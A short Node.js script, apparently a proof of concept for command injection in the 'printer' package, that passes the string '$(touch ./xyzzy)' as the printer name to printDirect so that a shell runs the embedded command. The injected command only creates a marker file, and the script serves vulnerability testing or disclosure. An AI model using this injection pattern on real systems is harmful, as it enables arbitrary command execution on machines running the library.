done = function done(){
    console.log("Done!");
};

var DUMMY_FILE = './xyzzy';

var payload = "$(touch " + DUMMY_FILE + ")";

function dummySource(val){
    payload += val;
}

dummySource(' ');

var printer = require("printer");

printer.printDirect({data:"Test",
    printer: "" + payload,
    // printer: "your_printer",
    success:function(jobID){
        console.log("sent to printer with ID: "+jobID);
    },
    error:function(err){
        console.log(err);
    }
});

done();